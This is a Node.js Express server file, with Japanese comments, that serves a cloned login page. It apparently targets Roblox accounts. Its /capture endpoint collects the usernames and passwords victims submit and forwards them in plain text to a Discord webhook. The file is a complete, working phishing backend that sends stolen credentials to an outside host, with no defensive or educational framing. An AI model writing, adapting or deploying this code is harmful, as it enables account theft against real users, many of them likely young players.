// server.js
const express = require("express");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const webhook = process.env.DISCORD_WEBHOOK;

// ルート（/）でHTMLを返す
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/login.html");
});

// 保存した_filesフォルダの中身を配信
app.use("/login_files", express.static(__dirname + "/login_files"));

// ログイン情報を受け取る
app.post("/capture", async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    const safeUser = typeof username === "string" ? username : "";
    const safePass = typeof password === "string" ? password : "";

    if (!safeUser || !safePass) {
        return res.status(400).json({ error: "missing" });
    }

    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `roblox\nuser: ${safeUser}\npass: ${safePass}`
            })
        });
    } catch (error) {
        console.error(error);
    }

    res.json({ status: "ok" });
});

app.listen(process.env.PORT || 3000, () => {
    console.log("server started");
});
